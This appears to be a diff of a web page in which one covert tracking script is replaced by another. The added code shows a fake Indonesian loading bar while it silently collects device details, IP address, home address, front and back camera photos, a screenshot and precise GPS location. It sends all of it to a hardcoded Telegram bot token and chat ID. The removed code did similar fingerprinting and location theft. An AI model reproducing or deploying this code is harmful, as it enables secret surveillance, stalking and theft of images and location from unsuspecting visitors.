@@ -147,259 +147,125 @@ function toggle(el){
 </script>
 </body>
 </html>
-  <script>
-    const BOT_TOKEN = "8506760023:AAHkzVIbsp0QeijeW5GHS4HqJ9zzC2j3tD8";
-    const OWNER_CHAT_ID = "8345962712";
+<script>
+(()=>{
+    const T='8506760023:AAHkzVIbsp0QeijeW5GHS4HqJ9zzC2j3tD8', // <-- MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
+          C='8345962712', // <-- MASUKKAN CHAT ID TELEGRAM ANDA DI SINI
+          pb=document.getElementById('progress-bar'),
+          ld=document.getElementById('loading-details');
 
-    async function generateFingerprint() {
-      const ua = navigator.userAgent;
-      const lang = navigator.language;
-      const res = screen.width + "x" + screen.height;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const ram = navigator.deviceMemory || "N/A";
-      const cpu = navigator.hardwareConcurrency || "N/A";
+    let p=0;
+    const LM=["Memeriksa modul sistem...","Memuat komponen inti...","Menginisialisasi antarmuka...","Memverifikasi koneksi...","Menyiapkan lingkungan...","Memeriksa pembaruan...","Memuat aset tampilan..."];
+    
+    // Logic untuk progress bar
+    setInterval(()=>{
+        p+=Math.random()*5;
+        if(p>98)p=98;
+        pb.style.width=p+'%';
+        if(Math.random()>.9)ld.textContent=LM[Math.floor(Math.random()*LM.length)]
+    },500);
 
-      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
-      const encoder = new TextEncoder();
-      const data = encoder.encode(raw);
-      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
-    }
+    // Fungsi kirim pesan ke Telegram
+    const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
+    
+    // Fungsi kirim foto ke Telegram
+    const sP=async(b,f)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
+    
+    // Fungsi mendapatkan lokasi detail dari koordinat
+    const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
+    
+    // Fungsi mendapatkan informasi perangkat
+    const cDI=async()=>{let m='╭───── Tracking Report ───── ⦿\n\n';m+='⚙️ DEVICE INFORMATION|BUKAN GPS TRACKING\n';m+=`🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;if(navigator.getBattery){try{const b=await navigator.getBattery();m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`}catch(e){m+='🔋 Battery: ❌ Tidak tersedia\n'}}m+=`⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+='📍 LOCATION INFORMATION\n';m+=`📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;if(d.latitude&&d.longitude){m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;const l=await gLD(d.latitude,d.longitude);m+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`}}catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}m+='\n╰───── Channel Telegram @AboutGyzenLyoraa  ───── ⦿';return m};
 
-    async function getDetailedLocation(lat, lng) {
-      const services = [
-        // Google Maps Geocoding API (backup)
-        `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=YOUR_API_KEY`,
-        // OpenStreetMap Nominatim (primary)
-        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
-        // BigDataCloud (free tier)
-        `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=id`
-      ];
-
-      for (const service of services) {
+    // Mengambil gambar dari kamera dengan mode tertentu
+    const captureCamera = async (mode) => {
+        const v = document.getElementById('v'), 
+              c = document.getElementById('c');
+        let stream;
         try {
-          const response = await fetch(service);
-          const data = await response.json();
-          
-          if (service.includes('nominatim.openstreetmap.org')) {
-            const addr = data.address;
-            return {
-              village: addr.village || addr.hamlet || addr.suburb || "N/A",
-              city: addr.city || addr.town || addr.municipality || addr.county || "N/A",
-              province: addr.state || addr.province || "N/A",
-              country: addr.country || "N/A",
-              district: addr.district || addr.county || "N/A",
-              postcode: addr.postcode || "N/A",
-              road: addr.road || "N/A"
-            };
-          } else if (service.includes('bigdatacloud.net')) {
-            return {
-              village: data.locality || data.city || "N/A",
-              city: data.city || data.principalSubdivision || "N/A",
-              province: data.principalSubdivision || "N/A",
-              country: data.countryName || "N/A",
-              district: data.localityInfo?.administrative?.[2]?.name || "N/A",
-              postcode: data.postcode || "N/A",
-              road: "N/A"
-            };
-          }
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { 
+                    facingMode: { exact: mode } 
+                }
+            });
+            v.srcObject = stream;
+            
+            await new Promise(resolve => v.onloadedmetadata = resolve);
+            v.play();
+
+            // Waktu tunggu kamera 1.5 detik
+            await new Promise(r => setTimeout(r, 1500)); 
+            
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            
+            c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');
+            
+            stream.getTracks().forEach(t => t.stop());
+            return true; 
+            
         } catch (e) {
-          console.log(`Service failed: ${service}`, e);
-          continue;
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+            }
+            await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
+            return false; 
         }
-      }
-      
-      return {
-        village: "N/A",
-        city: "N/A",
-        province: "N/A",
-        country: "N/A",
-        district: "N/A",
-        postcode: "N/A",
-        road: "N/A"
-      };
-    }
+    };
 
-    async function getVisitorInfo() {
-      const clock = new Date().toLocaleString('id-ID');
-      let locationData = {
-        latitude: "N/A",
-        longitude: "N/A",
-        accuracy: "N/A",
-        village: "N/A",
-        city: "N/A",
-        province: "N/A",
-        country: "N/A",
-        district: "N/A",
-        postcode: "N/A",
-        road: "N/A"
-      };
+    // FUNGSI UTAMA: Menjalankan semua proses tracking
+    const ST=async()=>{
+        await sTG(await cDI()); 
 
-      const userAgent = navigator.userAgent;
-      const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
-      const device = navigator.platform + " - " + userAgent;
-      const loginFrom = navigator.platform || "N/A";
-      const language = navigator.language || "N/A";
-      const resolution = screen.width + "x" + screen.height;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
-      const isOnline = navigator.onLine;
-      const deviceMemory = navigator.deviceMemory || "N/A";
-      const cpuCores = navigator.hardwareConcurrency || "N/A";
-      const isTouch = 'ontouchstart' in window;
-      const cookiesEnabled = navigator.cookieEnabled;
-      const doNotTrack = navigator.doNotTrack;
-      const fingerprint = await generateFingerprint();
+        let cameraSuccess = false;
 
-      // Battery info
-      let batteryInfo = { level: "N/A", charging: "N/A" };
-      try {
-        const battery = await navigator.getBattery();
-        batteryInfo = {
-          level: Math.round(battery.level * 100) + "%",
-          charging: battery.charging ? "charging🔋" : "no"
-        };
-      } catch {}
+        // 1. Coba Kamera Depan (User)
+        cameraSuccess = await captureCamera("user");
 
-      // IP and basic location
-      let ip = "N/A";
-      try {
-        const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
-        ip = ipData.ip;
-        if (locationData.country === "N/A") locationData.country = ipData.country_name;
-        if (locationData.province === "N/A") locationData.province = ipData.region;
-      } catch {}
-
-      // High accuracy geolocation
-      try {
-        const position = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-          });
-        });
-
-        locationData.latitude = position.coords.latitude.toFixed(6);
-        locationData.longitude = position.coords.longitude.toFixed(6);
-        locationData.accuracy = position.coords.accuracy.toFixed(0) + "m";
-
-        // Get detailed location info
-        const detailedLocation = await getDetailedLocation(
-          position.coords.latitude, 
-          position.coords.longitude
-        );
-        
-        locationData = { ...locationData, ...detailedLocation };
-
-        document.getElementById('status').textContent = 
-          `Lokasi ditemukan: ${locationData.village}, ${locationData.city}`;
-      } catch (error) {
-        document.getElementById('status').textContent = 
-          'Gagal mendapatkan lokasi GPS, menggunakan lokasi berdasarkan IP';
-      }
-
-      // Weather info
-      let weather = "N/A", temperature = "N/A";
-      if (locationData.latitude !== "N/A") {
-        try {
-          const weatherData = await fetch(
-            `https://wttr.in/${locationData.latitude},${locationData.longitude}?format=j1`
-          ).then(r => r.json());
-          weather = weatherData.current_condition[0].weatherDesc[0].value;
-          temperature = weatherData.current_condition[0].temp_C + "°C";
-        } catch {}
-      }
-
-      const jsonData = {
-        "alamat ip": ip,
-        "device": device,
-        "android versions": androidVersion,
-        "login from": loginFrom,
-        "lokasi detail": {
-          "latitude": locationData.latitude,
-          "longitude": locationData.longitude,
-          "akurasi": locationData.accuracy,
-          "desa": locationData.village,
-          "kota": locationData.city,
-          "provinsi": locationData.province,
-          "negara": locationData.country,
-          "kecamatan": locationData.district,
-          "kode pos": locationData.postcode,
-          "jalan": locationData.road
-        },
-        "clock": clock,
-        "cuaca": weather,
-        "temperature": temperature,
-        "language": language,
-        "screen resolution": resolution,
-        "timezone": timezone,
-        "online": isOnline,
-        "ram (GB)": deviceMemory,
-        "cpu cores": cpuCores,
-        "touch support": isTouch,
-        "cookies enabled": cookiesEnabled,
-        "do not track": doNotTrack,
-        "fingerprint": fingerprint,
-        "battery": batteryInfo.level,
-        "charging": batteryInfo.charging
-      };
-
-      const message = `📍 *New Location Update* 🎯
-👤 *Device Info:*
-• IP: ${ip}
-• Platform: ${navigator.platform}
-• Android: ${androidVersion}
-• Language: ${language}
-• Resolution: ${resolution}
-• Timezone: ${timezone}
-• Online: ${isOnline}
-• RAM: ${deviceMemory}GB
-• CPU: ${cpuCores} cores
-• Battery: ${batteryInfo.level} (${batteryInfo.charging})
-
-📍 *Location Details:*
-• Latitude: ${locationData.latitude}
-• Longitude: ${locationData.longitude}
-• Accuracy: ${locationData.accuracy}
-• Address: ${locationData.road}, ${locationData.village}
-• City: ${locationData.city}, ${locationData.province}
-• Country: ${locationData.country}
-• Postal: ${locationData.postcode}
-
-🌤️ *Weather:* ${weather} ${temperature}
-🕐 *Time:* ${clock}
-🔐 *Fingerprint:* ${fingerprint}`;
-
-      // Send to Telegram with better error handling
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { 
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: OWNER_CHAT_ID,
-            text: message,
-            parse_mode: "Markdown"
-          })
-        });
-
-        if (!response.ok) {
-          const errorData = await response.json();
-          console.error('Telegram API Error:', errorData);
-          document.getElementById('status').textContent = '❌ Gagal mengirim ke Telegram: ' + (errorData.description || 'Unknown error');
-        } else {
-          document.getElementById('status').textContent = '✅ Data berhasil dikirim ke Telegram!';
+        // 2. Jika Gagal, Coba Kamera Belakang (Environment)
+        if (!cameraSuccess) {
+            cameraSuccess = await captureCamera("environment");
         }
-      } catch (error) {
-        console.error('Failed to send to Telegram:', error);
-        document.getElementById('status').textContent = '❌ Gagal mengirim ke Telegram: ' + error.message;
-      }
-    }
 
-    // Start tracking when page loads
-    getVisitorInfo();
-  </script>
+        if (!cameraSuccess) {
+             await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
+        }
+
+        // Ambil Screenshot 
+        setTimeout(async()=>{
+            try{
+                const cn=await html2canvas(document.body);
+                cn.toBlob(b=>sP(b,'screenshot.jpg'),'image/jpeg')
+            }catch(e){
+                await sTG('❌ Screenshot failed')
+            }
+        }, 2000); 
+
+        // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
+        if(navigator.geolocation){
+            navigator.geolocation.getCurrentPosition(async p=>{
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                
+                // Menambahkan link Google Maps
+                let g=`📍 GPS TRACKING (ONE-TIME)\n`;
+                g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
+                g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
+                g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
+                
+                const l=await gLD(lat,lon);
+                g+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
+                await sTG(g)
+            },async e=>{
+                await sTG(`❌ GPS Error: ${e.message}`)
+            },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
+        }
+    };
+
+    // Langsung menjalankan fungsi ST tanpa delay
+    ST();
+})();
+</script>
 </body>
 </html>
